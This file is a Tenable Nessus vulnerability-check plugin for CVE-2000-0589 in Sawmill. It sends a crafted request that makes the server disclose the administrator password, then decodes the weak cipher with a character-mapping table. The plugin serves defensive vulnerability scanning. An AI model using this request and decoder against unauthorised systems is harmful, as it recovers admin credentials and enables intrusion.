#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
  script_id(10454);
  script_version ("$Revision: 1.30 $");
  script_cvs_date("$Date: 2016/02/19 18:54:50 $");

  script_cve_id("CVE-2000-0589");
  script_bugtraq_id(1403);
  script_osvdb_id(353);
  script_xref(name:"EDB-ID", value:"20042");

  script_name(english:"Sawmill Weak Password Encryption Scheme Information Disclosure");
  script_summary(english:"Attempts to obtain the Sawmill password.");

  script_set_attribute(attribute:"synopsis", value:
"An application running on the remote web server is affected by an
information disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Sawmill running on the remote web server is affected by
an information disclosure vulnerability due to the use of a weak hash
function. An unauthenticated, remote attacker can exploit this to
obtain the administrative user password.");
  script_set_attribute(attribute:"solution", value:
"Upgrade Sawmill to the latest available version.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2000/06/26");
  script_set_attribute(attribute:"patch_publication_date", value:"2000/10/13");
  script_set_attribute(attribute:"plugin_publication_date", value:"2000/06/27");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:sawmill:sawmill");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english: "CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2000-2016 Tenable Network Security, Inc.");

  script_dependencies("sawmill_detect.nasl", "sawmill.nasl");
  script_require_ports("Services/www", 8987, 8988);
  script_require_keys("installed_sw/Sawmill", "Sawmill/method");

  exit(0);
}

#
# The script code starts here
#
include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "Sawmill";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:8988, embedded:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];

method = get_kb_item_or_exit("Sawmill/method");

if (method == "cgi")
 cgi = 1;

else
  cgi = 0;

if (cgi)
  req = dir + "/sawmill?rfcf+%22SawmillInfo/SawmillPassword%22+spbn+1,1,21,1,1,1,1";
else
  req = dir + "/sawmill?rfcf+%22SawmillInfo/SawmillPassword%22+spbn+1,1,21,1,1,1,1,1,1,1,1,1+3";

w = http_send_recv3(method:"GET", item:req, port:port, exit_on_fail:TRUE);
r = w[2];

r = strstr(r, "Unknown configuration");
if (r)
{
  end = strstr(r, "<br>");
  r = r - end;
  pattern = ".*Unknown configuration command " + raw_string(0x22) +
            "(.*)" + raw_string(0x22) + " in .*$";

  pass = ereg_replace(string:r,  pattern:pattern, replace:"\1");
  if (empty_or_null(pass))
    exit(0, "Unable to parse the password from "+build_url(qs:req, port:port));

  #
  # Code from Larry W. Cashdollar
  #
  clear = "";
  len = strlen(pass);
  alpha  = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+~<>?:" + raw_string(0x22, 0x7B, 0x7D) + "|";

  encode = "=GeKMNQS~TfUVWXY"+raw_string(0x5B)+"abcygimrs"+raw_string(0x22)+"#$&-"+raw_string(0x5D)+"FLq4.@wICH2!oEn"+raw_string(0x7D)+"Z%(Ovt"+raw_string(0x7B)+"z";

  for (x = 0; x < len; x = x+1)
  {
    for (y = 0; y < strlen (encode); y=y+1)
    {
      if (pass[x] == encode[y])
        clear = clear + alpha[y];
    }
  }
  if (empty_or_null(clear)) clear = pass;

  report =
    '\nNessus was able to exploit this issue to obtain the '+app+' password'+
    '\nusing the following request :\n' +
    '\n' + build_url(qs:req, port:port) + '\n' +
    '\nThis request provides the '+app+' password below :\n' +
    '\n  ' + clear + '\n';

  security_report_v4(port:port, severity:SECURITY_HOLE, extra:report);
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, build_url(qs:dir,port:port));
